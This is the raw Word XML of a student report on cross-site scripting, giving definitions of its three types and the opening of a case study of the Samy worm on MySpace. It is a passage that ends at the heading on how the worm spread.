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A7453" w14:textId="77777777" w:rsidR="009A739E" w:rsidRDefault="009A739E" w:rsidP="009A739E">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0702EA4D" w14:textId="77777777" w:rsidR="009A739E" w:rsidRDefault="00A66412" w:rsidP="009A739E">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Report on the Most</w:t>
      </w:r>
      <w:r w:rsidR="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Famous XS</w:t>
      </w:r>
      <w:r w:rsidR="009A739E" w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">S </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Attack–</w:t>
      </w:r>
      <w:r w:rsidR="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>The Samy Worm on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC1A3F3" w14:textId="66F4ADBB" w:rsidR="006C6472" w:rsidRDefault="009A739E" w:rsidP="009A739E">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00A66412" w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>MySpace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1528C39B" w14:textId="119FA80F" w:rsidR="009A739E" w:rsidRDefault="009A739E" w:rsidP="009A739E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="34FF0B1C" wp14:editId="6C05E7CC">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-19050</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>212725</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5440680" cy="38100"/>
                <wp:effectExtent l="38100" t="38100" r="64770" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="1" name="Straight Connector 1"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="5440680" cy="38100"/>
                        </a:xfrm>
                        <a:prstGeom prst="line">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:ln w="19050"/>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09B3C2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6.75pt" to="426.9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" strokecolor="#4f81bd [3204]" strokeweight="1.5pt">
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:line>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F91B6DA" w14:textId="77777777" w:rsidR="009A739E" w:rsidRPr="009A739E" w:rsidRDefault="009A739E" w:rsidP="009A739E"/>
    <w:p w14:paraId="31BB7FEA" w14:textId="3BD3E0D7" w:rsidR="006C6472" w:rsidRPr="009A739E" w:rsidRDefault="00A66412" w:rsidP="009A739E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Name</w:t>
      </w:r>
      <w:r w:rsidR="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00236F89">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Manjeet Kumar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0126F74C" w14:textId="4AF58CF3" w:rsidR="006C6472" w:rsidRPr="009A739E" w:rsidRDefault="00A66412" w:rsidP="009A739E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Roll Number / Class / </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Section</w:t>
      </w:r>
      <w:r w:rsidR="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009530E1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE9D66E" w14:textId="0404EE91" w:rsidR="006C6472" w:rsidRPr="009A739E" w:rsidRDefault="00A66412" w:rsidP="009A739E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Submission </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Date</w:t>
      </w:r>
      <w:r w:rsidR="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 11</w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidR="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>July 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD42029" w14:textId="77777777" w:rsidR="006C6472" w:rsidRPr="009A739E" w:rsidRDefault="00A66412" w:rsidP="009A739E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A739E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E2C746" w14:textId="0FCF062E" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412" w:rsidP="00E65022">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E78151E" w14:textId="77777777" w:rsidR="00E65022" w:rsidRPr="00E65022" w:rsidRDefault="00E65022" w:rsidP="00E65022">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18192C17" w14:textId="77777777" w:rsidR="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Cross-Site Scripting (XSS)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a common and dangerous web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal session cookies, redirect users, manipulate DOM, and perform various harmful actions without the user's consent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24775627" w14:textId="1130CC45" w:rsidR="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>There are three main types of XSS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348BB325" w14:textId="163FB109" w:rsidR="00E65022" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Reflected </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Reflected XSS </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>occurs when input from a user is immediately returned by a web application without proper validation or escaping.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF4765A" w14:textId="77777777" w:rsidR="00E65022" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Stored </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Stored XSS </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>happens when the malicious script is permanently stored on the target server (e.g., in a database) and served to users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E037E00" w14:textId="2F6D1B5C" w:rsidR="006C6472" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">DOM-Based </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E65022" w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">DOM-Based XSS </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exploits the client-side scripts to manipulate the DOM environment in a way that executes malicious code.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>The real-world consequences of XSS were most famously demonstrated through the Samy Worm attack on MySpace. This incident highlighted how even a seemingly harmless script could have devastating results when proper security mechanisms are not in place.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BF68E6" w14:textId="77777777" w:rsidR="00E65022" w:rsidRPr="00E65022" w:rsidRDefault="00E65022">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6705C154" w14:textId="2BE383F3" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412" w:rsidP="00E65022">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Case Study: The Samy Worm on MySpace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728D2579" w14:textId="77777777" w:rsidR="00E65022" w:rsidRPr="00E65022" w:rsidRDefault="00E65022" w:rsidP="00E65022">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D6B31E" w14:textId="4D05A1BD" w:rsidR="006C6472" w:rsidRPr="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Who Created It?</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>The Samy Worm was created by Samy Kamkar, a security researcher and hacker.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What Was the Vulnerability?</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>The vulnerability exploited was a Stored XSS vulnerability on MySpace. The website failed to properly sanitize user-generated HTML and JavaScript content on profile pages.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>How Did It Spread?</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
